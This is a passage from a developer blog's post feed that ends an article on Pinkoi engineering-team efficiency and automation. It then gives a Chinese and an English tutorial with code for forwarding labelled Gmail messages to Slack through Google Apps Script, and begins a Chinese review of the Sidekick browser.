lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }I have also mentioned the application of Google Apps Scripts; for details, refer to: [Using Google Apps Script to Forward Gmail Messages to Slack](/posts/zrealm-dev/en/using-google-apps-script-to-forward-gmail-messages-to-slack-d414bdbdb8c9/).![](/assets/11f6c8568154/1*gdwkOBumSPH469IMCd8TVw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The last point is using Github Action to enhance collaboration efficiency (PR Review).Github Action is Github's CI/CD service that can be directly linked to Github events, with triggers available for open issues, open PRs, merging PRs, and more.Github Action can be used for any Git project hosted on Github. Public repositories have no restrictions, while private ones have a free quota of 2,000 minutes per month.**Here are two features:**- (Left) After a PR review is completed, it automatically adds a reviewer name label, allowing us to quickly summarize the PR review status.- (Right) Every day at a fixed time, it organizes and sends messages to a Slack channel, reminding teammates of PRs awaiting review ([mimicking the functionality of Pull Reminders](https://pullreminders.com/){:target=\"_blank\"}).Github Action has many other automation possibilities that everyone can explore.For example, issue bots commonly seen in open-source projects:![[fastlane](https://github.com/fastlane){:target=\"_blank\"} / [fastlane](https://github.com/fastlane/fastlane){:target=\"_blank\"}](/assets/11f6c8568154/1*64GaqzcldMHwU-HE4yt3_A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjIxMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }[fastlane](https://github.com/fastlane){:target=\"_blank\"} / [fastlane](https://github.com/fastlane/fastlane){:target=\"_blank\"}Or automatically closing PRs that haven't been merged for too long can also be accomplished using Github Action.![](/assets/11f6c8568154/1*olR70CQ2zbvTWwzh72-gRQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Recapping the effectiveness of automating the packaging of official versions, we again directly use existing tools for integration; in addition to **automation, we also incorporate fixed processes to double the improvement in work efficiency.**Originally, aside from the manual packaging time, there was also the additional cost of communicating about the release time, which is now reduced to zero; as long as we ensure we **board** on schedule, we can focus all our time on \"discussion\" and \"development.\"![](/assets/11f6c8568154/1*8CZSygOrZbXPVIDzx2AFRQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Calculating the total impact of these two automations, we can save 216 work hours in a year.![](/assets/11f6c8568154/1*d3I-cJoeUiT_h2uvZ8PgFw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }With automation and the previously mentioned communication interfaces, let's see how much efficiency we can enhance overall.![](/assets/11f6c8568154/1*xMFfrYqGJD6CPY8YTIVMIg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }In addition to the tasks we've just completed, we also need to evaluate the **cost of switching flow**. When we remain engaged in work for a period, we enter a \"flow\" state, where our thoughts and productivity peak, allowing for the most effective output. However, if we are interrupted by unnecessary matters (e.g., excessive communication, repetitive tasks), returning to that flow state requires additional time, which we can estimate at 30 minutes.![](/assets/11f6c8568154/1*_1Pe12uYqddPyd5muKuTMw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The cost of switching flow due to unnecessary interruptions should also be factored in; here, we estimate 30 minutes each time, occurring 10 times a month, resulting in an additional 3,600 hours wasted in a year for a team of 60.![](/assets/11f6c8568154/1*TllAhkbBRr7H1PSFB-iyfg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Flow switching cost (3,600) + excess communication due to poor communication interfaces (1,200) + automation resolving repetitive tasks (216) = a total loss of 5,016 hours in a year.The time wasted can be redirected towards more valuable tasks, so the actual productivity gain should be multiplied by 200%.&gt; **_Especially as the team size continues to grow, the impact on work efficiency also amplifies._**&gt; **_The sooner you optimize, the sooner you enjoy the benefits; delaying optimization comes with no discounts!!_**![](/assets/11f6c8568154/1*kRiuACBFiI-xjyxt_oKRMw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Recapping the inner workings of a high-efficiency work team, we primarily focused on what actions to take.&gt; **_No Code/Low Code First_** _Prioritize using existing tools for integration (like in this example). If there are no available tools, then evaluate the cost of investing in automation against the actual savings in revenue._### Support for Culture![At Pinkoi, everyone can be a problem-solving leader](/assets/11f6c8568154/1*HtF6bI9jcL95Dn3AHRXmcw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }At Pinkoi, everyone can be a problem-solving leader.For solving problems and making changes, it often requires a lot of teamwork to achieve better outcomes. This is where company culture plays a crucial role in providing support and encouragement; otherwise, pushing things forward alone can be very challenging.&gt; _At Pinkoi, everyone can be a problem-solving leader. You don't have to be a Lead or PM to solve problems. Many of the communication interfaces, tools, or automation projects mentioned earlier are often identified and proposed by teammates, and everyone works together to accomplish them._![](/assets/11f6c8568154/1*nbSdYTY3AQEVdCOYkWh04A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Regarding how team culture supports driving change, the four stages of problem-solving can be linked to Pinkoi's Core Values.**Step One: Grow Beyond Yesterday**- Always strive for better. If you discover a problem, regardless of its size, remember that as the team grows, even small issues can have a magnified effect.- Investigate and summarize the issues, avoiding premature optimization (some problems may just be temporary transitions).**Next is Build Partnerships**- Actively communicate and gather suggestions from all angles.- Maintain empathy (as some problems may be the best solution for others, so weigh your options carefully).**Step Three: Impact Beyond Your Role**- Leverage your influence.- Propose problem-solving plans.- If it relates to repetitive tasks, prioritize using automation solutions.- Remember to maintain flexibility and scalability to avoid over-engineering.**Finally, Dare to Fail!**- Be brave in your practice.- Continuously track and dynamically adjust solutions.- **After achieving success, remember to share the results with the team to facilitate cross-departmental resource integration** (as the same problem may exist in multiple departments).**This concludes the sharing from Pinkoi's highly efficient engineering team. Thank you, everyone.**Join Pinkoi now &gt;&gt;&gt; [https://www\\.pinkoi\\.com/about/careers](https://www.pinkoi.com/about/careers){:target=\"_blank\"}If you have any questions or feedback, feel free to [contact me](https://www.zhgchg.li/contact){:target=\"_blank\"}.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 2,818 Total Views Last Statistics Date: 2025-08-15 | 2,689 Views on Medium." }, { "title": "運用 Google Apps Script 轉發 Gmail 信件到 Slack", "url": "/posts/zrealm-dev/%E9%81%8B%E7%94%A8-google-apps-script-%E8%BD%89%E7%99%BC-gmail-%E4%BF%A1%E4%BB%B6%E5%88%B0-slack-d414bdbdb8c9/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, cicd, slack, workflow-automation", "date": "2021-08-07 20:19:49 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.運用 Google Apps Script 轉發 Gmail 信件到 Slack使用 Gmail Filter + Google Apps Script 在收到信件時自動將客製化內容轉寄至 Slack ChannelPhoto...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.運用 Google Apps Script 轉發 Gmail 信件到 Slack使用 Gmail Filter + Google Apps Script 在收到信件時自動將客製化內容轉寄至 Slack ChannelPhoto by Lukas Blazek起源最近在優化 iOS App CI/CD 的流程，使用 Fastlane 作為自動化工具；打包上傳後如果要繼續完成自動送審步驟 ( skip_submission=false )，就需要等蘋果完成 Process 大概需要浪費 30~40 mins 的 CI Server 時間，因為蘋果 App Store Connect API 並不完善，Fastlane 也只能每分鐘去檢查一次上傳的 Build 是否處理完成，非常浪費資源。 Bitrise CI Server： 限制同時 Builds 數量及最大執行時間 90 mins，90 mins 是夠，但會卡著一條 Build 阻礙其他人執行。 Travis CI Server： 依照 Build Time 收費，這樣更不能等了，錢直接打水漂。換個思路不等了，上傳完直接結束！靠處理完成的信件通知觸發後續動作。 不過最近我都沒收到這封信了，不知道是設定問題還是蘋果不再發此類通知。本文將以 Testflight 已經可以開始測試的信件通知為例。 完整流程如上圖所示，原理上可行；但不是本文要討論的重點，本文將著重在收到信件、使用 Apps Script 轉發至 Slack Channel 部分。如何轉發收到的 Email 到 Slack Channel不管是付費或是免費的 Slack 專案都能使用不同方法達成 Email 轉發到 Slack Channel or DM 功能。可參考官方文件進行設置： 傳送電子郵件至 Slack不管哪種方法效果都如下： 預設摺疊信件內容，點擊後可以展開查看全部內容。優點： 簡單快速 零技術門檻 即時轉送缺點： 無法對內容進行客製 顯示樣式無法更改客製轉發內容就是本篇要介紹的重點。將信件內容資料轉譯成自己想呈現的樣式，如上圖範例。先上一張完整運作流程圖： 使用 Gmail Filter 對要轉發信件加上辨識 Label Apps Script 定時獲取被標記成該 Label 的信件 讀取信件內容 渲然成想要的顯示樣式 透過 Slack Bot API 或直接用 Incoming Message 發送訊息到 Slack 移除信件 Label (代表已轉發) 完成首先，要在 Gmail 中建立篩選器篩選器可以在收到符合條件信件時自動化做一些事，例如：自動標記已讀、自動標記 Tag、自動移入垃圾郵件、自動歸入分類…等等操作在 Gmail 點擊右上進階搜尋圖標按鈕，輸入要轉發的信件規則條件，例如來自： no_reply@email.apple.com + 主題是 is now available to test. ，點擊「Search」查看篩選結果是否如預期；如果正確可以點擊 Search 旁的「Create filter」按鈕。或直接在信件裡上方點 Filter message like these 就能快速建立篩選條件 這按鈕設計很反人類，第一次找一直沒看到。下一步設定符合此篩選條件是的動作，這邊我們選「Apply the label」建立一個獨立新辨識用 Label 「forward-to-slack」，點擊「Create filter」完成。爾後被標上這個 Label 的信都會被轉發到 Slack。取得 Incoming WebHooks App URL首先我們要加入 Incoming WebHooks App 到 Slack Channel，我們會透過此媒介來傳送訊息。 Slack 左下角「Apps」-&gt;「Add apps」 右邊搜尋匡搜尋「incoming」 點擊「Incoming WebHooks」-&gt;「Add」選擇訊息想要傳到的 Channel。記下最上方的「Webhook URL」往下滑可設定傳送訊息時，傳送 Bot 顯示的名稱及大頭貼；改完記得按「Save Settings」。 備註 請注意官方建議使用新的 Slack APP Bot API 的 chat.postMessage 來傳送訊息，Incoming Webhook 簡便的這個方式之後會棄用，這邊偷懶沒有使用，可搭配下一章「匯入員工名單」會需要 Slack App API 一起調整成新方法。撰寫 Apps Script 程式 點此前往我的 Apps Script 專案 點選左上「新專案」 建立後，可點擊專案名稱重新命名 EX: ForwardEmailsToSlack貼上以下基本程式並修改成你想要的版本：function sendMessageToSlack(content) { var payload = { \"text\": \"*您收到一封信件*\", \"attachments\": [{ \"pretext\": \"信件內容如下:\", \"text\": content, } ] }; var res = UrlFetchApp.fetch('貼上你的Slack incoming Webhook URL',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })}function forwardEmailsToSlack() { // 參考自：https://gist.github.com/andrewmwilson/5cab8367dc63d87d9aa5 var label = GmailApp.getUserLabelByName('forward-to-slack'); var messages = []; var threads = label.getThreads(); if (threads == null) { return; } for (var i = 0; i &lt; threads.length; i++) { messages = messages.concat(threads[i].getMessages()) } for (var i = 0; i &lt; messages.length; i++) { var message = messages[i]; Logger.log(message); var output = '*New Email*'; output += '\\n*from:* ' + message.getFrom(); output += '\\n*to:* ' + message.getTo(); output += '\\n*cc:* ' + message.getCc(); output += '\\n*date:* ' + message.getDate(); output += '\\n*subject:* ' + message.getSubject(); output += '\\n*body:* ' + message.getPlainBody(); sendMessageToSlack(output); } label.removeFromThreads(threads);}進階： Slack 訊息樣式可參考這份官方結構文件 。 你可以使用 Javascript 的 Regex Match Function，對信件內容進行匹配爬取。EX：爬取 Testflight 審核成功信件內的版本號資訊：信件標題：Your app XXX has been approved for beta testing.信件內容：我們想得到 Bundle Version Short String 還有 Build Number 後面的值 。var results = subject.match(/(Bundle Version Short String: ){1}(\\S+){1}[\\S\\s]*(Build Number: ){1}(\\S+){1}/);if (results == null || results.length != 5) { // not vaild} else { var version = results[2]; var build = results[4];} Regex 使用方法可參考這裡 線上測試 Regex 是否正確可使用 此網站執行看看 回到 Gmail 隨便找一封信，手動幫他加上 Label — 「forward-to-slack」 在 Apps Script 程式碼編輯器上選擇「forwardEmailsToSlack」然後點擊「執行」按鈕若出現 「Authorization Required」則點選「Continue」完成驗證在身份驗證的過程中會出現「Google hasn’t verified this app」這是正常的，因為我們寫的 App Script 沒有經過 Google 驗證，不過沒關係這是寫給自己用的。可點選左下角「Advanced」-&gt;「Go to ForwardEmailsToSlack (unsafe)」點擊「Allow」轉發成功！！！設置觸發器(排程)自動檢查＆轉發在 Apps Script 左方選單列，選擇「觸發條件」。左下角「+ 新增觸發條件」。 錯誤通知設定：可設定當腳本執行遇到錯誤時，該如何通知你 選擇您要執行的功能：選擇 Main Function sendMessageToSlack 選取活動來源：可選擇來自日曆或是時間驅動(定時或指定) 選取時間型觸發條件類型：可選特定日期執行或每分/時/日/週/月執行一次 選取分/時/日/週/月間隔：EX: 每分鐘、每 15 分鐘… 這邊為了示範設定成每分鐘執行一次，我覺得信件的即時程度可以設每小時檢查一次就好。 再次回到 Gmail 隨便找一封信，手動幫他加上 Label — 「forward-to-slack」 等待排程觸發自動檢查＆轉發成功！完工藉由此功能便能達成客製化信件轉發處理，甚至是再當成觸發器使用，例如：收到 XXX 信時自動執行某腳本。回到第一章起源，我們便可以使用此機制，完善 CI/CD 流程；不需要呆呆等待蘋果完成處理，又能串上自動化流程！延伸閱讀 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 Slack 打造全自動 WFH 員工健康狀況回報系統 APP有用HTTPS傳輸，但資料還是被偷了。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,979 Total Views Last Statistics Date: 2025-08-15 | 1,923 Views on Medium." }, { "title": "Using Google Apps Script to Forward Gmail Messages to Slack", "url": "/posts/zrealm-dev/en/using-google-apps-script-to-forward-gmail-messages-to-slack-d414bdbdb8c9/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, cicd, slack, workflow-automation", "date": "2021-08-07 20:19:49 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Using Google Apps Script to Forward Gmail Messages to SlackAutomatically forward cus...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Using Google Apps Script to Forward Gmail Messages to SlackAutomatically forward customized content to a Slack Channel using Gmail Filter + Google Apps Script when receiving emails.Photo by Lukas BlazekOriginRecently, while optimizing the CI/CD process for an iOS app, I used Fastlane as the automation tool. After packaging and uploading, if I wanted to continue with the automatic submission steps ( skip_submission=false ), I had to wait for Apple to complete the process, which could waste about 30-40 minutes of CI server time. This is because the Apple App Store Connect API is not very robust, and Fastlane can only check once per minute whether the uploaded build has been processed, which is a waste of resources. Bitrise CI Server: Limits the number of concurrent builds and has a maximum execution time of 90 minutes. While 90 minutes is sufficient, it can block one build from allowing others to execute. Travis CI Server: Charges based on build time, making it even less feasible to wait, as costs would accumulate.A Change in PerspectiveNo more waiting; finish the upload and move on! Trigger subsequent actions based on the notification of the completed email. However, I haven’t received this email recently; I’m not sure if it’s a settings issue or if Apple has stopped sending such notifications.This article will use the notification email for TestFlight, which is already available for testing, as an example. The complete process is illustrated in the image above; while the principle is feasible, it is not the focus of this article. This article will concentrate on receiving emails and using Apps Script to forward them to a Slack Channel.How to Forward Received Emails to a Slack ChannelWhether you have a paid or free Slack project, there are various methods to achieve email forwarding to a Slack Channel or DM.You can refer to the official documentation for setup: Send Emails to SlackRegardless of the method, the effect is as follows: By default, the email content is collapsed, and you can click to expand and view all content.Advantages: Simple and quick No technical barriers Instant forwardingDisadvantages: Cannot customize content Display style cannot be changedCustomizing Forwarded ContentThis is the main point of this article.Translate the email content into the style you want to present, as shown in the example above.First, here’s a complete workflow diagram: Use Gmail Filter to label the emails to be forwarded. Apps Script periodically retrieves emails marked with that label. Read the email content. Render it in the desired display style. Send messages to Slack via Slack Bot API or directly using Incoming Message. Remove the email label (indicating it has been forwarded). Done.First, create a filter in GmailFilters can automate actions when receiving emails that meet certain criteria, such as automatically marking as read, tagging, moving to spam, categorizing, etc.In Gmail, click the advanced search icon in the upper right, enter the criteria for the emails to be forwarded, such as from: no_reply@email.apple.com + subject is is now available to test., click “Search” to check if the filter results are as expected; if correct, click the “Create filter” button next to Search.Or directly click Filter message like these at the top of the email to quickly create filter criteria. This button is designed in a very user-unfriendly way; I couldn’t find it the first time.Next, set the action for emails that meet this filter condition. Here, we choose “Apply the label” to create a new identifying label “forward-to-slack,” and click “Create filter” to complete it.From now on, emails marked with this label will be forwarded to Slack.Obtain Incoming WebHooks App URLFirst, we need to add the Incoming WebHooks App to the Slack Channel, which we will use to send messages. In Slack, click “Apps” in the lower left -&gt; “Add apps” Search for “incoming” in the search box on the right. Click “Incoming WebHooks” -&gt; “Add”Select the channel where you want to send messages.Take note of the “Webhook URL” at the top.Scroll down to set the display name and avatar for the bot when sending messages; remember to click “Save Settings” after making changes. Note Please note that the official recommendation is to use the new Slack APP Bot API’s chat.postMessage to send messages. The simpler Incoming Webhook method will be deprecated in the future. I took a shortcut here, but it will need to be adjusted to the new method in the next chapter “Import Employee List.”Write the Apps Script Code Click here to go to my Apps Script project Click “New Project” in the upper left. After creating it, you can click the project name to rename it, e.g., ForwardEmailsToSlack.Paste the following basic code and modify it to your desired version:function sendMessageToSlack(content) { var payload = { \"text\": \"*You have received an email*\", \"attachments\": [{ \"pretext\": \"The email content is as follows:\", \"text\": content, } ] }; var res = UrlFetchApp.fetch('Paste your Slack incoming Webhook URL here',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })}function forwardEmailsToSlack() { // Reference from: https://gist.github.com/andrewmwilson/5cab8367dc63d87d9aa5 var label = GmailApp.getUserLabelByName('forward-to-slack'); var messages = []; var threads = label.getThreads(); if (threads == null) { return; } for (var i = 0; i &lt; threads.length; i++) { messages = messages.concat(threads[i].getMessages()) } for (var i = 0; i &lt; messages.length; i++) { var message = messages[i]; Logger.log(message); var output = '*New Email*'; output += '\\n*from:* ' + message.getFrom(); output += '\\n*to:* ' + message.getTo(); output += '\\n*cc:* ' + message.getCc(); output += '\\n*date:* ' + message.getDate(); output += '\\n*subject:* ' + message.getSubject(); output += '\\n*body:* ' + message.getPlainBody(); sendMessageToSlack(output); } label.removeFromThreads(threads);}Advanced: You can refer to this official structure document for Slack message styles. You can use JavaScript’s Regex Match Function to match and scrape content from the email.EX: Scraping the version number information from the TestFlight approval email:Email subject: Your app XXX has been approved for beta testing.Email content:We want to obtain the Bundle Version Short String and the value after Build Number.var results = subject.match(/(Bundle Version Short String: ){1}(\\S+){1}[\\S\\s]*(Build Number: ){1}(\\S+){1}/);if (results == null || results.length != 5) { // not valid} else { var version = results[2]; var build = results[4];} You can refer to this for Regex usage. You can use this website to test if your Regex is correct.Let’s Run It Go back to Gmail, find any email, and manually add the label — “forward-to-slack.” In the Apps Script code editor, select “forwardEmailsToSlack” and then click the “Run” button.If “Authorization Required” appears, click “Continue” to complete the verification.During the authentication process, you may see “Google hasn’t verified this app,” which is normal since our Apps Script has not been verified by Google. However, that’s fine since it’s for personal use.You can click “Advanced” in the lower left -&gt; “Go to ForwardEmailsToSlack (unsafe).”Click “Allow.”Forwarding successful!!!Set Up a Trigger (Schedule) for Automatic Checking &amp; ForwardingIn the left menu of Apps Script, select “Triggers.”Click the lower left “+ Add Trigger.” Error notification settings: You can set how to notify you when the script encounters an error. Choose the function you want to execute: Select the Main Function sendMessageToSlack. Select event source: You can choose from calendar or time-driven (scheduled or specific). Select time-based trigger type: You can choose to execute on a specific date or once every minute/hour/day/week/month. Select interval for minutes/hours/days/weeks/months: EX: every minute, every 15 minutes… Here, to demonstrate, I set it to execute once every minute. I think checking emails every hour would be sufficient for real-time needs. Again, go back to Gmail, find any email, and manually add the label — “forward-to-slack.” Wait for the scheduled trigger.Automatic checking &amp; forwarding successful!CompletionWith this functionality, you can achieve customized email forwarding processing, and even use it as a trigger for actions, such as automatically executing a script when receiving a specific email.Returning to the origin discussed in the first chapter, we can use this mechanism to enhance the CI/CD process; there’s no need to wait idly for Apple to complete processing, and we can integrate it into an automated workflow!Further Reading Building a More Immediate and Convenient Crash Tracking Tool with Crashlytics + Big Query Automatically Querying App Crash-Free Users Rate with Crashlytics + Google Analytics Using Python + Google Cloud Platform + Line Bot to Automate Routine Tasks Creating a Fully Automated WFH Employee Health Reporting System with Slack The App Uses HTTPS for Transmission, but Data Still Gets Stolen.If you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,979 Total Views Last Statistics Date: 2025-08-15 | 1,923 Views on Medium." }, { "title": "生產力工具 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱", "url": "/posts/zrealm-life/%E7%94%9F%E7%94%A2%E5%8A%9B%E5%B7%A5%E5%85%B7-%E6%8B%8B%E6%A3%84-chrome-%E6%8A%95%E5%85%A5-sidekick-%E7%80%8F%E8%A6%BD%E5%99%A8%E7%9A%84%E6%87%B7%E6%8A%B1-118e924a1477/", "categories": "ZRealm Life.", "tags": "sidekick, chrome, chromium, browsers, 生活", "date": "2021-08-07 13:06:43 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱Sidekick 瀏覽器功能介紹＆使用心得2024 Update大約 2023 年初我就跳槽去用 Arc 瀏覽器啦！ 使用體驗跟功能更好、Bug 更少、也...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱Sidekick 瀏覽器功能介紹＆使用心得2024 Update大約 2023 年初我就跳槽去用 Arc 瀏覽器啦！ 使用體驗跟功能更好、Bug 更少、也支援跨電腦同步功能。Here’s a link to download Arc, the browser I was telling you about!https://arc.net/gift/f86ef8b3前言知道 Sidekick 瀏覽器是來自同事的分享；老實說一開始並沒有抱太大期待，其實這幾年一直都有拋棄 Chrome 的念頭，改用過 Safari、搶先體驗版的 Safari、Firefox、Opera、基於開源核心開發的第三方瀏覽器，但屢屢失敗，幾乎用不了幾天就又認錯裝回 Chrome，另外一個原因是自己並沒有很積極的 Follow 瀏覽器市場，也許早就有符合我需求的瀏覽器，只是我不知道罷了。失敗原因主要原因是我常用的擴充功能不能完全支援，太依賴也太習慣 Chrome 的擴充功能了，其次就算是 Chromium 核心能無痛支援但功能方面並沒有特別亮點，跟用 Google Chrome 體驗差不多。我的需求 Chromium 核心，因為要支援我常用的擴充功能 有更多特色功能，幫助提升生產力 支援 MacOS，iOS 我習慣用 Safari 所以不要求支援跨裝置 優秀的記憶體管理 加強隱私反追蹤 無痛轉移功能關於生產力功能，其實 Chrome 擴充功能有上千萬的工具可以用，自己搜尋、組合起來也能達到效果；但是我們沒做過研究調查，老實說不太清楚什麼流程跟功能是對生產力有幫助的。關於 Sidekick 開發團隊：Sidekick 新創團隊創立於 2020/11 @ San-Francisco / 募資中 瀏覽器核心：Chromium 當前階段：early access 核心價值： 專為工作流程優化，提升生產力的瀏覽器 支援平台：Windows、Mac OS、Mac OS (M1)、Linux (deb)、Linux (rpm) 擴充功能：支援所有 Chrome Store 擴充功能 (bitwarden、lastpass 、1password、grammarly、google translate…) 官方網站： www.meetsidekick.com馬上下載使用 點此進入官方網站 點擊「Download Now」 選擇符合自己作業系統的版本 下載＆完成安裝 開啟 Sidekick映入眼簾的是 Sidekick 介紹頁，點擊上方「Continue」繼續。使用 Google、Microsoft 或直接建立 Sidekick 帳號；這個帳號是 for Sidekick 服務的帳號，與 Google、Microsoft 無關。⬇️⬇️⬇️ 如果你是從 Chrome 要轉換到 Sidekick， 請先閱讀完本章節再繼續建立帳號 ⬇️⬇️⬇️ 跟 Chrome 不同 Chrome 安裝完的登入帳號就是直接綁定、同步 Google 帳號上的瀏覽器資料； 你會發現 Sidekick 這步登入完帳號什麼資料也沒進來，原因是 Google 目前封鎖所有第三方服務存取同步功能 ，所以 Sidekick 無法直接透過帳號做同步、匯入資料。人員資料部分也不能同步 Google 的帳號資訊Sidekick 同步設定，只有可憐的搜尋字詞同步那要如何匯入 Chrome 資料呢？官方給的方法非常繞路，但目前也只能這樣。如果你本來就是 Chrome 的使用者可以跳過 1~3 步驟。 下載＆安裝 Chrome 登入 Chrome 完成同步 Google 帳號上的瀏覽器資料到 Chrome 完全關閉 Chrome ( ! 重要 !，MacOS 用戶請確認 Dock 上 Chrome Icon 下面沒有小點點) 繼續前一步的建立帳號 第一次建立完帳號，會問你要從哪個瀏覽器匯入資料 選擇 Chrome 等待匯入完成匯入完成後，所有書籤、瀏覽紀錄、已存密碼、已登入的網站 Session、擴充功能，都會無痛搬移到 Sidekick 上；只有少部分服務需要重新登入，其他都不用，等於無痛轉移！ 這邊有個小問題，就是如果非建立新帳號（EX: 重裝）就只能書籤、瀏覽紀錄、已存密碼；擴充功能無法自動匯入， 查官方 Q&amp;A 只得到自己從 Chrome extension / app store 重裝 。同步問題？既然 Google 封鎖第三方存取雲端資料，那如何解決書籤跨裝置同步問題呢？Sidekick 近期將會釋出 Sidekick Sync 解決這個問題 。 本文使用的是我個人電腦，非辦公用；所以會夾雜社群娛樂網站，敬請見諒。特色功能無痛轉移如同前文安裝步驟，第一次安裝打開、建立帳號登入後；可以無痛從現有的 Safari、Chrome、Edge 無痛轉移所有書籤、瀏覽紀錄、已存密碼、已登入的網站 Session、擴充功能。已登入的網站 Session、擴充功能我覺得是體驗最好的，以往的瀏覽器都只做書籤的轉移，但所有網站都要重新登入、所有擴充功能都要重新安裝，非常的消耗耐心。強大的首頁功能與 Chrome 單調的首頁不同也不需要花心力去找首頁解決方案，Sidekick 自帶精美又方便的首頁功能。 搜尋匡可搜尋 瀏覽紀錄、書籤，若無搜尋結果則自動變 Google 搜尋 左上方數據化顯示反追蹤、記憶體管理、反廣告狀況 顯示今日日期、現在時間 上方我們稱為 Tab，左側工具列上方稱為 Application 首頁背景圖可客製化，或自動展示風景圖Application 功能不只是網站的快速入口， 使用起來類似 MacOS 的 Dock，Application 網站啟用時會常駐在瀏覽器上（左方有小點點）但同時又會做好記憶體管理；啟用狀態下如果網站有通知會標記數字提醒。Application 可以快速從首頁加入，也可以從 Tab 建立或手動輸入網址、ICON 圖片加入。Sidekick 